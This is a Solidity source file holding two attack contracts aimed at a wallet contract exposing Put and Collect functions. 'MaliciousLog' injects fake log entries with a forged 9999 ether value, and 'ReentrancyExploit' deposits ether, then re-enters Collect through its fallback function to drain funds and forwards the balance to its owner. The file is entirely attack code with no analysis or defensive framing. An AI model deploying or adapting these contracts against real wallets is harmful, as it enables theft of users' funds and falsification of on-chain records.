pragma solidity ^0.4.25;

interface IXWallet {
    function Put(uint _unlockTime) external payable;
    function Collect(uint _am) external payable;
}

contract MaliciousLog {
    struct Message {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;
    Message public LastMsg;

    function AddMessage(address _adr, uint _val, string _data) public {
        // Arbitrary data injection
        LastMsg.Sender = tx.origin; // Breaks invariant
        LastMsg.Time = now;
        LastMsg.Val = 9999 ether;   // Fake value
        LastMsg.Data = "Exploit";
        History.push(LastMsg);
    }
}

contract ReentrancyExploit {
    IXWallet public target;
    address public owner;
    uint public reentryCount = 0;

    constructor(address _target) public {
        target = IXWallet(_target);
        owner = msg.sender;
    }

    function beginAttack() external payable {
        require(msg.value >= 1 ether);
        // Step 1: deposit to self with short unlock time
        target.Put.value(1 ether)(now + 1);
    }

    function collectNow(uint amount) external {
        // Call after unlock time
        target.Collect(amount);
    }

    function() external payable {
        if (reentryCount < 3) {
            reentryCount++;
            target.Collect(1 ether); // Reenter multiple times
        }
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }
}

